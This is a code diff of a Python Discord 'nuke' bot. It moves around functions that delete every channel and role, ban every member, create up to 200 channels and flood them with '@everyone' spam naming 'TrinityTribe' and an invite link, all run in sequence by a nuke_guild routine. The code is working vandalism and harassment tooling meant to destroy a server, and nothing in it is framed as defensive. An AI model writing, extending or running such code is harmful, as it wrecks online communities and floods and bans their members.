@@ -56,18 +56,6 @@ async def delete_all_roles(guild):
             print(f'Error deleting role {role.name}: {e}')
     return deleted
 
-# Async function to ban all members in a guild
-async def ban_all_members(guild):
-    banned = 0
-    for member in guild.members:
-        try:
-            await member.ban()
-            banned += 1
-        except discord.HTTPException as e:
-            print(f'Error banning member {member.name}: {e}')
-    return banned
-
-# Async function to create text channels in a guild
 async def create_text_channels(guild, name):
     created = 0
     for _ in range(200 - len(guild.channels)):
@@ -89,6 +77,17 @@ async def spam_messages_in_channels(guild, message, rate_per_minute=500):
                 print(f'Error sending message to {channel.name}: {e}')
             await asyncio.sleep(wait_time)
 
+# Async function to ban all members in a guild
+async def ban_all_members(guild):
+    banned = 0
+    for member in guild.members:
+        try:
+            await member.ban()
+            banned += 1
+        except discord.HTTPException as e:
+            print(f'Error banning member {member.name}: {e}')
+    return banned
+
 # Async function to nuke a guild (delete channels, roles, ban members, create channels)
 async def nuke_guild(guild, name):
     print(f'Nuke: {guild.name}')
@@ -98,15 +97,15 @@ async def nuke_guild(guild, name):
     
     deleted_channels = await delete_all_channels(guild)
     print(f'Deleted Channels: {deleted_channels}')
-    
-    deleted_roles = await delete_all_roles(guild)
-    print(f'Deleted Roles: {deleted_roles}')
-    
+
     created_channels = await create_text_channels(guild, name)
     print(f'Created Text Channels: {created_channels}')
     
     spam_message = "@everyone Get nuked by TrinityTribe! Stop Scamming! Keep the world in peace! https://discord.gg/TrinityTribe"
     await spam_messages_in_channels(guild, spam_message)
+    
+    deleted_roles = await delete_all_roles(guild)
+    print(f'Deleted Roles: {deleted_roles}')
     
     print('--------------------------------------------\n\n')
 
